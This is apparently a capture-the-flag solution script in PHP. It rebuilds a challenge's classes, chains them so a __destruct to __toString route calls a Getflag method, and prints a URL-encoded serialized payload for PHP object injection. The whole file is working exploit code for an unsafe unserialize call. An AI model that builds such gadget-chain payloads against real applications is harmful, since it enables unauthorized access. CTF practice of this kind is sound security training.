<?php
highlight_file(__FILE__);
class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';
}

class w22m{
    public $w00m;
}

class w33m{
    public $w00m;
    public $w22m;
}
# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
$a = new w22m();
$b = new w33m();
$c = new w44m();
$a->w00m=$b; 
$b->w00m=$c;
$b->w22m='Getflag';
echo urlencode(serialize($a));
?>
